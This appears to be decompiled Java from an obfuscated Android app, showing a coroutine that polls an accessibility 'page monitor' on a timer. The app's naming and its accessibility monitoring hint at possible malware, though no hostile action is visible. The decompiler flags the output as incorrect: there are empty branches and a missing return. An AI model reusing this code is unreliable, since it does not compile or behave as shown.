package com.storm.safe.rock.service;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.AbstractC1117qo;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$startAccessibilityPageMonitor$1", m214403f = "dqtvuisjd.kt", m214404l = {997}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$startAccessibilityPageMonitor$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52701a1;

    /* renamed from: a2 */
    public /* synthetic */ Object f52702a2;

    /* renamed from: a3 */
    public final /* synthetic */ dqtvuisjd f52703a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$startAccessibilityPageMonitor$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52703a3 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        dqtvuisjd$startAccessibilityPageMonitor$1 dqtvuisjd_startaccessibilitypagemonitor_1 = new dqtvuisjd$startAccessibilityPageMonitor$1(this.f52703a3, interfaceC0876mv);
        dqtvuisjd_startaccessibilitypagemonitor_1.f52702a2 = obj;
        return dqtvuisjd_startaccessibilitypagemonitor_1;
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$startAccessibilityPageMonitor$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x0027 A[Catch: Exception -> 0x0021, TRY_ENTER, TryCatch #0 {Exception -> 0x0021, blocks: (B:6:0x000d, B:16:0x0036, B:19:0x0046, B:21:0x004c, B:22:0x0052, B:13:0x0027), top: B:27:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:18:0x0045  */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0046 A[Catch: Exception -> 0x0021, TryCatch #0 {Exception -> 0x0021, blocks: (B:6:0x000d, B:16:0x0036, B:19:0x0046, B:21:0x004c, B:22:0x0052, B:13:0x0027), top: B:27:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0058  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:14:0x0033 -> B:16:0x0036). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        InterfaceC0920no interfaceC0920no;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52701a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            interfaceC0920no = (InterfaceC0920no) this.f52702a2;
            if (AbstractC1117qo.m214443d9(interfaceC0920no)) {
            }
        } else {
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            interfaceC0920no = (InterfaceC0920no) this.f52702a2;
            try {
                kg1.m213544f4(obj);
            } catch (Exception unused) {
            }
            long jCurrentTimeMillis = System.currentTimeMillis() - dqtvuisjd.f52365m8;
            dqtvuisjd dqtvuisjdVar = this.f52703a3;
            if (jCurrentTimeMillis >= dqtvuisjdVar.f52451i2) {
                if (dqtvuisjd.m211417b6(dqtvuisjdVar)) {
                    dqtvuisjd.m211409a8(this.f52703a3);
                } else {
                    this.f52703a3.f52445h6 = 0;
                }
            }
            if (AbstractC1117qo.m214443d9(interfaceC0920no)) {
                long j = this.f52703a3.f52448h9;
                this.f52702a2 = interfaceC0920no;
                this.f52701a1 = 1;
                if (b81.m210571b1(j, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                long jCurrentTimeMillis2 = System.currentTimeMillis() - dqtvuisjd.f52365m8;
                dqtvuisjd dqtvuisjdVar2 = this.f52703a3;
                if (jCurrentTimeMillis2 >= dqtvuisjdVar2.f52451i2) {
                }
                if (AbstractC1117qo.m214443d9(interfaceC0920no)) {
                    return C1351vv.f60710b1;
                }
            }
        }
    }
}
